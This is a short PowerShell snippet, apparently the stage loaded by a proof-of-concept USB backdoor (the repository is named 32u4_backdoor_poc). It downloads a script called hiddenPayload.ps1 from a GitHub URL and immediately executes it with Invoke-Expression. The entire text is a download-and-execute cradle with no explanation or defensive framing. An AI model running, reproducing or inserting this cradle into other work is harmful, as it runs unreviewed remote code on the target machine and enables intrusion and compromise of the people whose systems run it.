$uri = "https://raw.githubusercontent.com/jarviscodes/32u4_backdoor_poc/master/test/hiddenPayload.ps1";
$script_content = $(Invoke-WebRequest($uri)).Content;
Invoke-Expression $script_content ;